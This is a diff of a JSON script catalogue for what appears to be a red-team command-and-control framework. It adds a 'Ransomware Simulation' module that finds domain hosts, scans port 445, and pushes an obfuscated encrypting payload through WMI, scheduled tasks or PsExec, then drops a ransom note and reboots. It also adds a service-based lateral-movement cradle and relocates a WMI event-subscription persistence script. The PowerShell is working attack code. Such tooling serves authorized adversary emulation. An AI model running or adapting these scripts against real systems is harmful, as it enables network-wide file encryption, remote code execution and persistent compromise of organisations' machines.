@@ -161,6 +161,32 @@
     "enabled": true
   },
   {
+    "identifier": "816c32cda1ac4f6698525d7e1786074c",
+    "name": "Ransomware Simulation",
+    "description": "This script simulates a ransomware attack by distributing and obfuscated encrypter via WMI, Scheduled Task, or PsExec.",
+    "documentation": "# Overview\r\n\r\nThis script distributes an obfuscated ransomware payload via WMI, Scheduled Task, or PsExec from left to right until on succeeds. The script can use either impersonation or username and password for authentication. For targetting, the script can either pull a list of domain computers from Active Directory instance tied to the current user or take in a target list containing hostnames, IPs, or CIDR ranges. When using auto targetting, the Specter implant must be running under a domain user account. Once a target list is built, the list is resolved to IP addresses. The IP addresses of the localhost are removed from the list so that your foothold in the network is not impacted.\r\n\r\nNext, the script performs a multithreaded port scan of each IP on port 445 to identify live hosts. Once that is complete, the script generates a new obfuscated ransomware payload and PowerShell stager script. Those two payloads are cached in the server. Live hosts then are passed to a multithreaded cmdlet to run a PowerShell cradle on each live system that will download the PowerShell stager script that loads the ransomware payload.\r\n\r\nThe ransomware payload looks for all files in C:\\Users\\ with specific extensions. It the begins encrypting each file and deleting the original. The encrypted files are stored with the keys to decrypt so that a real threat actor could not use this script to ransom a target. It also gives students an opportunity to practice recovery using forensic malware analysis. Once encryption completes, the ransomware drops a ransom note application and creates a shortcut in the global startup folder. It then reboots the system. The next user to logon will see the ransom note.\r\n\r\n# Dependencies\r\n\r\n- recon\r\n- lateral\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Pre-Requisites\r\n\r\n- Valid administrator credentials for the target system(s) or domain.\r\n\r\n# Example Output\r\n\r\n```\r\nComputerName  ScheduledTask                     Success\r\n------------  -------------                     -------\r\n192.168.1.2   @{Success=True; Message=Success!}    True\r\n192.168.1.103 @{Success=True; Message=Success!}    True\r\n```",
+    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$False, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$False, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string[]]$Targets,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [Parameter(ParameterSetName=\"Autotarget - Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [Parameter(ParameterSetName=\"Autotarget - Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password\r\n)\r\n\r\n#Import dependencies\r\nload recon;\r\nload lateral;\r\n\r\n#Build a list of IP addresses to target\r\nif($Targets -eq $null -or $Targets.Length -le 0) {\r\n    #Autotarget from Active Directory\r\n    $computers = computers | resolve | % { $_.ToString() };\r\n} else {\r\n    #Use explicit targetting\r\n    $computers = $Targets | resolve | % { $_.ToString() };\r\n}\r\n\r\n#Build a list of local IP addressess\r\n$localhost = New-Object 'System.Collections.Generic.Dictionary[string, string]';\r\n$interfaces = interfaces;\r\nforeach($interface in $interfaces) {\r\n    foreach($entry in $interface.InterfaceIPs) {\r\n        $ip = $entry.IP.ToString();\r\n        if(!$localhost.ContainsKey($ip)) {\r\n            $localhost.Add($ip, $ip);\r\n        }\r\n    }\r\n}\r\n\r\n#Remove localhost from target list\r\n$computers = $computers | ? { !$localhost.ContainsKey($_); }\r\n\r\n#Find systems that are alive via a quick port scan\r\n$scan = scan -Targets ([string[]]$computers) -Ports @(445);\r\n$alive = $scan | ? { $_.'445' -eq 'OPEN' };\r\n$addresses = $alive | % { $_.IPAddress; }\r\n\r\n#Generate the payload\r\n$payload = payload -Kind 'ps_ransom_command';\r\n\r\n#Pre-generate stage 2 and 3\r\npayload -Kind 'ps_ransom_script' | Out-Null;\r\npayload -Kind 'csharp_ransomware' | Out-Null;\r\n\r\n#Deploy the payload to the targets we can reach\r\ntry {\r\n    $results = Invoke-ParallelCommand -Targets ([string[]]$addresses) -Command $payload -Username $Username -Password $Password;\r\n} catch {\r\n    $_.Exception;\r\n}\r\n\r\n#Output the results\r\n$results",
+    "version": 2,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "powershell",
+      "remote-system-discovery",
+      "scheduled-task",
+      "windows-management-instrumentation",
+      "service-execution",
+      "windows",
+      "system-network-configuration-discovery",
+      "lateral-movement",
+      "active",
+      "network-service-discovery",
+      "ransomware",
+      "impact",
+      "data-encrypted-for-impact"
+    ],
+    "enabled": true
+  },
+  {
     "identifier": "afd1e2b21f334a31b4fa6aa30461f63b",
     "name": "Lateral Movement with Scheduled Tasks and PowerShell Cradle Commandline",
     "description": "This script leverages schtasks.exe, username, and password to remotely execute a Specter PowerShell cradle.",
@@ -293,6 +319,27 @@
       "passive",
       "remote-system-discovery",
       "windows"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "9a66866d779849a89d3ea33a444600b1",
+    "name": "Lateral Movement Using Service Control Manager and PowerShell Cradle (PSExec)",
+    "description": "This script loads a SpecterInsight implant onto the remote system by creating and executing a service that runs a PowerShell command that reflectively loads a Specter.",
+    "documentation": "# Overview\r\n\r\nThis script leverages the Service Control Manager API to create and execute a remote service on the operator specified system using impersonation or username and password. The service runs a PowerShell command that downloads and executes an obfuscated script to load a Specter. The service is run under the NT AUTHORITY\\SYSTEM account.\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Dependencies\r\n\r\n- common\r\n- lateral\r\n\r\n# Pre-Requisites\r\n\r\n- Valid credentials for the target systems.\r\n- Service Control Manager\r\n- Firewall permissions to establish RPC connections\r\n- Server Service\r\n- Administrative Shares enabled\r\n- Firewall permissions allowing SMB connections",
+    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The name of the service to create on the remote system.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The name of the service to create on the remote system.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$ServiceName = \"SpecterSvc\"\r\n)\r\n\r\nload common;\r\nload lateral;\r\n\r\n#Generate a new PowerShell cradle command\r\n$cradle = payload -Build $Build -Kind 'ps_command';\r\n#$cradle = $cradle.Replace(\"\\\", \"\\\\\");\r\n#$cradle = $cradle.Replace('\"', '\\\"');\r\n$command = \"C:\\Windows\\System32\\cmd.exe /c $cradle\";\r\n\r\n#Copy the payload to the remote system\r\ntry {\r\n    if([string]::IsNullOrEmpty($Username)) {\r\n        #Create the service\r\n        Create-Service -ComputerName $Target -ServiceName $ServiceName -Path $command -NoStart:$false;\r\n    } else {\r\n        #Create the service\r\n        Create-Service -ComputerName $Target -ServiceName $ServiceName -Path $command -Username $Username -Password $Password -NoStart:$false;\r\n    }\r\n    $success = $true;\r\n} catch {\r\n    $success = $false;\r\n    throw;\r\n} finally {\r\n    Remove-Service -Name $ServiceName;\r\n}\r\n\r\nNew-Object psobject -Property @{\r\n    Lateral = New-Object psobject -Property @{\r\n        Method = \"System Sevice\";\r\n        ServiceName = $serviceName;\r\n        Payload = 'ps_cradle';\r\n        System = $Target;\r\n        Username = $Username;\r\n        Success = $success;\r\n    };\r\n};",
+    "version": 8,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "create-or-modify-system-process",
+      "lateral-movement",
+      "service-execution",
+      "system-services",
+      "valid-accounts",
+      "windows",
+      "windows-service",
+      "powershell"
     ],
     "enabled": true
   },
@@ -982,23 +1029,6 @@
     "enabled": true
   },
   {
-    "identifier": "e67933e81c3f4c0eab8392dced8a0e1a",
-    "name": "System Persistence with WMI Event Subscription and PowerShell Cradle",
-    "description": "Establishes System level persistence by registering a WMI Event Consumer that triggers when the startup time exceeds 1387 seconds and then runs a PowerShell cradle.",
-    "documentation": "# Overview\r\n\r\nThis script leverages WMI to subscribe to an event and execute Specter cradle when that event occurs, providing persistence on a system. WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus will result in elevated SYSTEM privileges. There are four different triggers that can be used for persistence:\r\n\r\n- **OnStartup:** Executes between 4 and 5 minutes after system startup.\r\n- **OnLogon:** Executes on any user logon.\r\n- **OnInterval:** Executes on an operator specified interval (e.g. every X seconds).\r\n- **OnTime:** Executes at an operator local time every day.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Pre-Requisites\r\n\r\n- High Integrity process.\r\n\r\n# Example Output\r\n\r\n```json\r\n{\r\n  \"Persistence\": {\r\n    \"Id\": \"babc72a228f94b1fb98d9c232d078e9b\",\r\n    \"Method\": \"WMI Event Subscription\",\r\n    \"Trigger\": \"OnInterval\",\r\n    \"Profile\": \"System\",\r\n    \"Event\": \"Create\",\r\n    \"Success\": true,\r\n    \"UninstallScript\": \"try {\\r\\n\\t$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \\\"Name = 'SCM Health Check Consumer'\\\"\\r\\n\\t$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \\\"Name = 'SCM Health Check Filter'\\\"\\r\\n\\t$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \\\"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\\\"\\r\\n\\t$TimerIdToRemove = Get-WmiObject -Class __IntervalTimerInstruction -Filter \\\"TimerId='44631667'\\\"\\r\\n\\t\\r\\n\\t$FilterConsumerBindingToCleanup | Remove-WmiObject\\r\\n\\t$EventConsumerToCleanup | Remove-WmiObject\\r\\n\\t$EventFilterToCleanup | Remove-WmiObject\\r\\n\\tif($TimerIdToRemove -ne $null) { $TimerIdToRemove | Remove-WmiObject }\\r\\n\\t$success = $true\\r\\n} catch {\\r\\n\\t$success = $false\\r\\n\\tthrow\\r\\n}\\r\\n\\t    \\r\\nNew-Object PSObject -Property @{\\r\\n\\tPersistence = New-Object PSObject -Property @{\\r\\n\\t\\tId = \\\"babc72a228f94b1fb98d9c232d078e9b\\\";\\r\\n\\t\\tEvent = \\\"Delete\\\";\\r\\n\\t\\tSuccess = $success;\\r\\n\\t    Method = \\\"WMI Event Subscription\\\";\\r\\n\\t    Profile = \\\"System\\\";\\r\\n\\t    Trigger = \\\"OnInterval\\\";\\r\\n\\t}\\r\\n}\",\r\n    \"ConsumerName\": \"SCM Health Check Consumer\",\r\n    \"FilterName\": \"SCM Health Check Filter\"\r\n  }\r\n}\r\n```",
-    "scriptBlock": "param(\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The name of the WMI event filter.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$FilterName = 'SCM Health Check Filter',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The name of the WMI event consumer.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$ConsumerName = 'SCM Health Check Consumer',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The type of event that will run a new PowerShell cradle.\")]\r\n    [ValidateSet('OnStartup', 'OnLogon', 'OnInterval', 'OnTime')]\r\n    [string]$Trigger = 'OnStartup',\r\n\r\n    [Parameter(Mandatory = $false, HelpMessage = \"The number of seconds between executions of the PowerShell cradle if using the OnInterval trigger.\")]\r\n    [int]$IntervalPeriod = 3600,\r\n\r\n    [Parameter(Mandatory = $false, HelpMessage = \"A specific time to execute the PowerShell cradle if using the OnTime trigger in hh:mm:ss format.\")]\r\n    [ValidateNotNull()]\r\n    [TimeSpan]$ExecutionTime = '10:00:00',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build\r\n)\r\n\r\ntry {\r\n\t#Get the URLs for the cradle generator\r\n\t$command = payload -Build $Build -Kind 'ps_command';\r\n\t\r\n\t#Build the filter query\r\n\t$TimerId = Get-Random;\r\n\tSwitch ($Trigger) {\r\n\t    'OnStartup' {\r\n\t        $query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"\r\n\t    }\r\n\t    \r\n\t    'OnLogon' {\r\n\t        $query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'\"\r\n\t    }\r\n\t        \r\n\t    'OnInterval' {\r\n\t        Set-WmiInstance -class '__IntervalTimerInstruction' -Arguments @{ IntervalBetweenEvents = ($IntervalPeriod * 1000); TimerId = $TimerId } | Out-Null\r\n\t        $query = \"Select * from __TimerEvent where TimerId = '$TimerId'\"\r\n\t    }\r\n\t        \r\n\t    'OnTime' {\r\n\t        $query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ExecutionTime.Hour.ToString()) AND TargetInstance.Minute = $($ExecutionTime.Minute.ToString()) GROUP WITHIN 60\"\r\n\t    }  \r\n\t}\r\n\t\r\n\t#Register the filter\r\n\t$FilterArgs = @{\r\n\t    Name=$FilterName;\r\n\t    EventNameSpace='root\\CimV2';\r\n\t    QueryLanguage=\"WQL\";\r\n\t    Query=$query;\r\n\t};\r\n\r\n\t#Register the filter\r\n\t$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs\r\n\t\r\n\t#Register a commandline consumer\r\n\t$ConsumerArgs = @{\r\n\t    name=$ConsumerName;\r\n\t    CommandLineTemplate=$command;\r\n\t}\r\n\t\r\n\t#Register the consumer\r\n\t$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs\r\n\t\r\n\t#Bind the filter to the consumer\r\n\t$FilterToConsumerArgs = @{\r\n\t    Filter = $Filter;\r\n\t    Consumer = $Consumer;\r\n\t}\r\n\t#This binds the consumer to the filter\r\n\t$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs\r\n\t\r\n\t$success = $true;\r\n} catch {\r\n\t$success = $false;\r\n\tthrow;\r\n}\r\n\r\n#Generate persistence ID\r\n$id = [Guid]::NewGuid().ToString().Replace(\"-\", \"\");\r\n\r\n#Log output\r\nNew-Object PSObject -Property @{\r\n\tPersistence = New-Object PSObject -Property @{\r\n\t\tId = $id;\r\n\t\tEvent = \"Create\";\r\n\t\tSuccess = $success;\r\n\t    Method = \"WMI Event Subscription\";\r\n\t    Profile = \"System\";\r\n\t    Trigger = $Trigger;\r\n\t    FilterName = $FilterName;\r\n\t    ConsumerName = $ConsumerName;\r\n\t    Build = $Build;\r\n\t    UninstallScript = @\"\r\ntry {\r\n\t`$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = '$ConsumerName'\"\r\n\t`$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = '$FilterName'\"\r\n\t`$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {CommandLineEventConsumer.Name='$ConsumerName'} WHERE ResultClass = __FilterToConsumerBinding\"\r\n\t`$TimerIdToRemove = Get-WmiObject -Class __IntervalTimerInstruction -Filter \"TimerId='$TimerId'\"\r\n\t\r\n\t`$FilterConsumerBindingToCleanup | Remove-WmiObject\r\n\t`$EventConsumerToCleanup | Remove-WmiObject\r\n\t`$EventFilterToCleanup | Remove-WmiObject\r\n\tif(`$TimerIdToRemove -ne `$null) { `$TimerIdToRemove | Remove-WmiObject }\r\n\t`$success = `$true\r\n} catch {\r\n\t`$success = `$false\r\n\tthrow\r\n}\r\n\t    \r\nNew-Object PSObject -Property @{\r\n\tPersistence = New-Object PSObject -Property @{\r\n\t\tId = \"$id\";\r\n\t\tEvent = \"Delete\";\r\n\t\tSuccess = `$success;\r\n\t    Method = \"WMI Event Subscription\";\r\n\t    Profile = \"System\";\r\n\t    Trigger = \"$Trigger\";\r\n\t}\r\n}\r\n\"@;\r\n\t}\r\n}",
-    "version": 11,
-    "isPremium": true,
-    "labels": [
-      "api",
-      "event-triggered-execution",
-      "persistence",
-      "windows",
-      "windows-management-instrumentation-event-subscription"
-    ],
-    "enabled": true
-  },
-  {
     "identifier": "97d6b0d64b4548b3b3e597786e97823c",
     "name": "User Persistence with Scheduled Task Commandline and PowerShell Cradle",
     "description": "Installs persistence by creating a scheduled task to run a PowerShell cradle on user logon.",
@@ -1015,6 +1045,23 @@
       "scheduled-task",
       "windows",
       "windows-command-shell"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "e67933e81c3f4c0eab8392dced8a0e1a",
+    "name": "System Persistence with WMI Event Subscription and PowerShell Cradle",
+    "description": "Establishes System level persistence by registering a WMI Event Consumer that triggers when the startup time exceeds 1387 seconds and then runs a PowerShell cradle.",
+    "documentation": "# Overview\r\n\r\nThis script leverages WMI to subscribe to an event and execute Specter cradle when that event occurs, providing persistence on a system. WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus will result in elevated SYSTEM privileges. There are four different triggers that can be used for persistence:\r\n\r\n- **OnStartup:** Executes between 4 and 5 minutes after system startup.\r\n- **OnLogon:** Executes on any user logon.\r\n- **OnInterval:** Executes on an operator specified interval (e.g. every X seconds).\r\n- **OnTime:** Executes at an operator local time every day.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Pre-Requisites\r\n\r\n- High Integrity process.\r\n\r\n# Example Output\r\n\r\n```json\r\n{\r\n  \"Persistence\": {\r\n    \"Id\": \"babc72a228f94b1fb98d9c232d078e9b\",\r\n    \"Method\": \"WMI Event Subscription\",\r\n    \"Trigger\": \"OnInterval\",\r\n    \"Profile\": \"System\",\r\n    \"Event\": \"Create\",\r\n    \"Success\": true,\r\n    \"UninstallScript\": \"try {\\r\\n\\t$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \\\"Name = 'SCM Health Check Consumer'\\\"\\r\\n\\t$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \\\"Name = 'SCM Health Check Filter'\\\"\\r\\n\\t$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \\\"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\\\"\\r\\n\\t$TimerIdToRemove = Get-WmiObject -Class __IntervalTimerInstruction -Filter \\\"TimerId='44631667'\\\"\\r\\n\\t\\r\\n\\t$FilterConsumerBindingToCleanup | Remove-WmiObject\\r\\n\\t$EventConsumerToCleanup | Remove-WmiObject\\r\\n\\t$EventFilterToCleanup | Remove-WmiObject\\r\\n\\tif($TimerIdToRemove -ne $null) { $TimerIdToRemove | Remove-WmiObject }\\r\\n\\t$success = $true\\r\\n} catch {\\r\\n\\t$success = $false\\r\\n\\tthrow\\r\\n}\\r\\n\\t    \\r\\nNew-Object PSObject -Property @{\\r\\n\\tPersistence = New-Object PSObject -Property @{\\r\\n\\t\\tId = \\\"babc72a228f94b1fb98d9c232d078e9b\\\";\\r\\n\\t\\tEvent = \\\"Delete\\\";\\r\\n\\t\\tSuccess = $success;\\r\\n\\t    Method = \\\"WMI Event Subscription\\\";\\r\\n\\t    Profile = \\\"System\\\";\\r\\n\\t    Trigger = \\\"OnInterval\\\";\\r\\n\\t}\\r\\n}\",\r\n    \"ConsumerName\": \"SCM Health Check Consumer\",\r\n    \"FilterName\": \"SCM Health Check Filter\"\r\n  }\r\n}\r\n```",
+    "scriptBlock": "param(\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The name of the WMI event filter.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$FilterName = 'SCM Health Check Filter',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The name of the WMI event consumer.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$ConsumerName = 'SCM Health Check Consumer',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The type of event that will run a new PowerShell cradle.\")]\r\n    [ValidateSet('OnStartup', 'OnLogon', 'OnInterval', 'OnTime')]\r\n    [string]$Trigger = 'OnStartup',\r\n\r\n    [Parameter(Mandatory = $false, HelpMessage = \"The number of seconds between executions of the PowerShell cradle if using the OnInterval trigger.\")]\r\n    [int]$IntervalPeriod = 3600,\r\n\r\n    [Parameter(Mandatory = $false, HelpMessage = \"A specific time to execute the PowerShell cradle if using the OnTime trigger in hh:mm:ss format.\")]\r\n    [ValidateNotNull()]\r\n    [TimeSpan]$ExecutionTime = '10:00:00',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build\r\n)\r\n\r\ntry {\r\n\t#Get the URLs for the cradle generator\r\n\t$command = payload -Build $Build -Kind 'ps_command';\r\n\t\r\n\t#Build the filter query\r\n\t$TimerId = Get-Random;\r\n\tSwitch ($Trigger) {\r\n\t    'OnStartup' {\r\n\t        $query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"\r\n\t    }\r\n\t    \r\n\t    'OnLogon' {\r\n\t        $query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'\"\r\n\t    }\r\n\t        \r\n\t    'OnInterval' {\r\n\t        Set-WmiInstance -class '__IntervalTimerInstruction' -Arguments @{ IntervalBetweenEvents = ($IntervalPeriod * 1000); TimerId = $TimerId } | Out-Null\r\n\t        $query = \"Select * from __TimerEvent where TimerId = '$TimerId'\"\r\n\t    }\r\n\t        \r\n\t    'OnTime' {\r\n\t        $query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ExecutionTime.Hour.ToString()) AND TargetInstance.Minute = $($ExecutionTime.Minute.ToString()) GROUP WITHIN 60\"\r\n\t    }  \r\n\t}\r\n\t\r\n\t#Register the filter\r\n\t$FilterArgs = @{\r\n\t    Name=$FilterName;\r\n\t    EventNameSpace='root\\CimV2';\r\n\t    QueryLanguage=\"WQL\";\r\n\t    Query=$query;\r\n\t};\r\n\r\n\t#Register the filter\r\n\t$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs\r\n\t\r\n\t#Register a commandline consumer\r\n\t$ConsumerArgs = @{\r\n\t    name=$ConsumerName;\r\n\t    CommandLineTemplate=$command;\r\n\t}\r\n\t\r\n\t#Register the consumer\r\n\t$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs\r\n\t\r\n\t#Bind the filter to the consumer\r\n\t$FilterToConsumerArgs = @{\r\n\t    Filter = $Filter;\r\n\t    Consumer = $Consumer;\r\n\t}\r\n\t#This binds the consumer to the filter\r\n\t$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs\r\n\t\r\n\t$success = $true;\r\n} catch {\r\n\t$success = $false;\r\n\tthrow;\r\n}\r\n\r\n#Generate persistence ID\r\n$id = [Guid]::NewGuid().ToString().Replace(\"-\", \"\");\r\n\r\n#Log output\r\nNew-Object PSObject -Property @{\r\n\tPersistence = New-Object PSObject -Property @{\r\n\t\tId = $id;\r\n\t\tEvent = \"Create\";\r\n\t\tSuccess = $success;\r\n\t    Method = \"WMI Event Subscription\";\r\n\t    Profile = \"System\";\r\n\t    Trigger = $Trigger;\r\n\t    FilterName = $FilterName;\r\n\t    ConsumerName = $ConsumerName;\r\n\t    Build = $Build;\r\n\t    UninstallScript = @\"\r\ntry {\r\n\t`$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = '$ConsumerName'\"\r\n\t`$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = '$FilterName'\"\r\n\t`$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {CommandLineEventConsumer.Name='$ConsumerName'} WHERE ResultClass = __FilterToConsumerBinding\"\r\n\t`$TimerIdToRemove = Get-WmiObject -Class __IntervalTimerInstruction -Filter \"TimerId='$TimerId'\"\r\n\t\r\n\t`$FilterConsumerBindingToCleanup | Remove-WmiObject\r\n\t`$EventConsumerToCleanup | Remove-WmiObject\r\n\t`$EventFilterToCleanup | Remove-WmiObject\r\n\tif(`$TimerIdToRemove -ne `$null) { `$TimerIdToRemove | Remove-WmiObject }\r\n\t`$success = `$true\r\n} catch {\r\n\t`$success = `$false\r\n\tthrow\r\n}\r\n\t    \r\nNew-Object PSObject -Property @{\r\n\tPersistence = New-Object PSObject -Property @{\r\n\t\tId = \"$id\";\r\n\t\tEvent = \"Delete\";\r\n\t\tSuccess = `$success;\r\n\t    Method = \"WMI Event Subscription\";\r\n\t    Profile = \"System\";\r\n\t    Trigger = \"$Trigger\";\r\n\t}\r\n}\r\n\"@;\r\n\t}\r\n}",
+    "version": 11,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "event-triggered-execution",
+      "persistence",
+      "windows",
+      "windows-management-instrumentation-event-subscription"
     ],
     "enabled": true
   },
@@ -1052,21 +1099,6 @@
     "enabled": true
   },
   {
-    "identifier": "acb5b5f5b4ca44adb6a8d2227570dd00",
-    "name": "Get Host File Entries",
-    "description": "Gets the IP, domain name, and comments for each host entry.",
-    "documentation": "# Overview\r\n\r\nUses regular expressions to parse out information about each host entry. This may give some insight to various system names in the target environment.\r\n\r\n# Example Output\r\n\r\n```\r\nIP           HostName       Comment\r\n--           --------       -------\r\n102.54.94.97 rhino.acme.com\r\n```",
-    "scriptBlock": "$Hosts = Join-Path -Path $($env:windir) -ChildPath \"system32\\drivers\\etc\\hosts\"\r\n\r\n[regex]$nonwhitespace = \"\\S\"\r\n\r\n$HostsArray = Get-Content $Hosts | Where-Object { (($nonwhitespace.Match($_)).value -ne \"#\") -and ($_ -notmatch \"^\\s+$\") -and ($_.Length -gt 0) } # exlcude full-line comments and blank lines\r\n\r\n$ResultsArray = foreach($Entry in $HostsArray) {\r\n    $Entry -match \"(?<IP>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\\s+(?<HOSTNAME>\\S+)\" | Out-Null\r\n\r\n    $IP = $matches.IP\r\n    $HostName = $matches.HostName\r\n\r\n    if ($Entry.contains(\"#\")) {\r\n        $Comment = $Entry.substring($Entry.indexof(\"#\")+1)\r\n    }\r\n\r\n    New-Object psobject -Property @{\r\n        IP = $IP\r\n        HostName = $HostName\r\n        Comment = $Comment \r\n    }\r\n}\r\n\r\n$ResultsArray | Select-Object IP, HostName, Comment",
-    "version": 1,
-    "isPremium": true,
-    "labels": [
-      "passive",
-      "recon",
-      "windows"
-    ],
-    "enabled": true
-  },
-  {
     "identifier": "c9d714e83137443d9068300439669c0c",
     "name": "Get All Open Connections via Commandline",
     "description": "This script retrieves all open connections using netstat.",
@@ -1083,19 +1115,16 @@
     "enabled": true
   },
   {
-    "identifier": "e78a44a9165b4482b72a52bc84c53fde",
-    "name": "List Files via API",
-    "description": "Lists files and folders in the specified directory.",
